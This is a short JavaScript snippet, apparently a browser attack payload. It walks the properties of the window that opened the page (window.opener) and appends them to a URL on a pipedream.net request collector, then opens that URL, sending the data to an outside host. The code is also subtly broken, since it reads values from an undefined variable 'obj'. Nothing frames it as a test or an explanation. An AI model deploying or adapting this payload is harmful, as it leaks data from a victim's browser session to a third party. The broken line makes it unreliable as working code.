let baseurl = "https://eozr3kmrbmb1rnm.m.pipedream.net?"
baseurl += "window_opener=" + window.opener;
baseurl += "&"
if (window.opener != null){
    
    let keys = Object.keys(window.opener);
    keys.forEach(key => {
        baseurl += key + "=" + obj[key];
        baseurl += "&"
        console.log(key + "=" + obj[key])
    });
}
window.open(baseurl)
